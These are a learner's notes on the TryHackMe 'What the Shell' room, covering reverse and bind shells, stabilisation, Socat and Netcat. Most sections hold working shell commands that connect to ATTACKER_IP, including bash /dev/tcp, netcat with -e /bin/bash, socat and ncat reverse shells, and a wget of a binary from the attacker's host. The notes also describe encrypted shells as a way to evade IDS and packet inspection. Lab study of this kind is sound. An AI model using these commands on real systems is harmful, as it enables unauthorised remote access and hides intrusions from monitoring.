# Shell Notes — What the Shell (TryHackMe)

---

## What is a Shell?

A shell is a program that allows interaction with the operating system through a command interface. Tools like `bash`, `zsh`, and `sh` are all shells.

```
You → Shell → Kernel → Hardware
```

In a cybersecurity context, **"getting a shell"** means being able to execute commands on the target system.

### Reverse Shell
The target machine connects back to the attacker. A listener is opened on the attacker's side.

```bash
# Attacker
nc -lvnp 4444

# Target
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

**Why it's preferred:** Even if the target has a firewall blocking incoming connections, outgoing connections are usually allowed.

### Bind Shell
The target machine waits, and the attacker connects to it.

```bash
# Target
nc -lvnp 4444 -e /bin/bash

# Attacker
nc TARGET_IP 4444
```

**Disadvantage:** Requires an open port on the target — may be blocked by a firewall.

### Shell Types (Stability)

| Type | Description |
|---|---|
| Dumb shell | Only runs commands; no TAB completion, CTRL+C drops the connection |
| Semi-interactive | Partial interactivity |
| Fully interactive (PTY) | Behaves like a real terminal; `vim`, `su`, `ssh` all work |

---

## Interactive vs Non-Interactive Shell

### Interactive Shell
A shell designed for real-time interaction with the user.
- TAB completion, history, CTRL+C/Z all work
- Commands that wait for input — `su`, `ssh`, `sudo`, `vim` — work correctly
- A `bash` session opened in a terminal is this type

### Non-Interactive Shell
A shell that runs automatically and does not expect user input.
- Cron jobs and bash scripts run in this mode
- Commands like `su` and `ssh` cannot prompt for input — they either error out or behave unexpectedly

### Why Does This Matter?
Shells obtained via Netcat are **non-interactive** by default:

```bash
$ su root     # no password prompt appears
$ vim file    # screen gets corrupted
```

A PTY upgrade is needed to make them interactive.

---

## Shell Stabilisation

A Netcat shell arrives as dumb/non-interactive. Stabilisation means converting it into a real terminal.

### Method 1: Python PTY (Most Common)

```bash
# 1. Spawn a PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. Send to background
# CTRL+Z

# 3. Enable raw mode and return
stty raw -echo; fg

# 4. Fix the terminal
export TERM=xterm
```

Explanation of `stty raw -echo`:
- `raw`: passes each character directly
- `-echo`: prevents double display
- Now CTRL+C sends a signal to the target shell instead of dropping the connection

### Method 2: rlwrap

```bash
rlwrap nc -lvnp 4444
```

Enables history and arrow keys. A quick temporary fix for systems without Python.

### Method 3: Socat

```bash
# Attacker
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Target
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
```

Gives a fully interactive shell directly. May not be installed on the target — transfer a static binary in that case:

```bash
# Attacker — serve the binary
python3 -m http.server 8080

# Target — download it
wget http://ATTACKER_IP:8080/socat -O /tmp/socat
chmod +x /tmp/socat
```

### Fixing Terminal Size

If `vim` looks broken after stabilisation:

```bash
# On your own terminal
stty size   # e.g.: 38 167

# On the target shell
stty rows 38 cols 167
```

### Comparison

| Method | Stability | Requirement |
|---|---|---|
| Python PTY | Medium-Good | Python 3 (on target) |
| rlwrap | Weak-Medium | rlwrap (on attacker) |
| Socat | Full | Socat (on target) |

---

## Socat — Definition, Difference from Netcat, and Usage

Socat (SOcket CAT) is a tool that establishes a bidirectional data stream between two endpoints. Unlike Netcat, it supports stream types beyond TCP/UDP — including PTY, Unix sockets, and files.

### Netcat vs Socat

| Feature | Netcat | Socat |
|---|---|---|
| Core function | TCP/UDP stream | Any type of stream |
| PTY support | No | Yes |
| SSL support | No | Yes |
| Syntax | Simple | Verbose but powerful |
| Likely present on target | High | Low |
| Stability | Low | High |

### Syntax Logic

Socat always takes two addresses:

```bash
socat [ADDRESS_1] [ADDRESS_2]
```

### Simple Listener / Connector

```bash
# Netcat
nc -lvnp 4444
nc TARGET_IP 4444

# Socat equivalent
socat TCP-LISTEN:4444 -
socat - TCP:TARGET_IP:4444
```

### Reverse Shell

```bash
# Netcat
nc -lvnp 4444
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Socat equivalent
socat TCP-LISTEN:4444 -
socat TCP:ATTACKER_IP:4444 EXEC:"bash -li"
```

### Fully Interactive Reverse Shell

```bash
# Attacker
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444

# Target
socat TCP:ATTACKER_IP:4444 EXEC:"bash -li",pty,stderr,setsid,sigint,sane
```

| Parameter | Description |
|---|---|
| `file:\`tty\`` | Connects the attacker's terminal to the stream |
| `raw,echo=0` | Raw mode, echo disabled |
| `pty` | Creates a pseudo-terminal on the target |
| `stderr` | Includes error output |
| `setsid` | Starts in a new session |
| `sigint` | Forwards CTRL+C signal |
| `sane` | Resets terminal settings |

### Bind Shell

```bash
# Netcat
nc -lvnp 4444 -e /bin/bash
nc TARGET_IP 4444

# Socat equivalent
socat TCP-LISTEN:4444 EXEC:"bash -li"
socat - TCP:TARGET_IP:4444
```

---

## Encrypted Shell

An encrypted shell encrypts traffic between two endpoints using SSL/TLS. Normal shell traffic travels in plaintext — a sysadmin using an IDS/IPS or network monitor can see exactly what is being done.

### Normal Shell vs Encrypted Shell

| Situation | Normal Shell | Encrypted Shell |
|---|---|---|
| IDS/IPS detection | Easily detected | Traffic is encrypted, content is invisible |
| Wireshark monitoring | Commands visible in plaintext | Meaningless encrypted data |
| Deep Packet Inspection | Blocked | Looks like HTTPS, passes through |

### Generating a Certificate (On the Attacker's Side)

```bash
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
cat shell.key shell.crt > shell.pem
```

- `-nodes`: private key without a passphrase (so no prompt appears during connection)
- `-x509`: self-signed certificate
- `shell.pem`: combined key + certificate

### Encrypted Reverse Shell

```bash
# Attacker
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 file:`tty`,raw,echo=0

# Target
socat OPENSSL:ATTACKER_IP:4444,verify=0 EXEC:"bash -li",pty,stderr,setsid,sigint,sane
```

### Encrypted Bind Shell

```bash
# Target (certificate must be on the listener side)
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 EXEC:"bash -li",pty,stderr,setsid,sigint,sane

# Attacker
socat OPENSSL:TARGET_IP:4444,verify=0 file:`tty`,raw,echo=0
```

**Note:** In a bind shell the certificate lives on the target; in a reverse shell it lives on the attacker.

### What Does `verify=0` Mean?
Disables certificate verification. Since a self-signed certificate is not signed by a CA, the connection is made without verification. This is sufficient in a pentesting environment.

### Alternative with Ncat

```bash
# Attacker
ncat -lvnp 4444 --ssl

# Target
ncat ATTACKER_IP 4444 --ssl -e /bin/bash
```

Not as powerful as Socat, but the syntax is much simpler.


[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
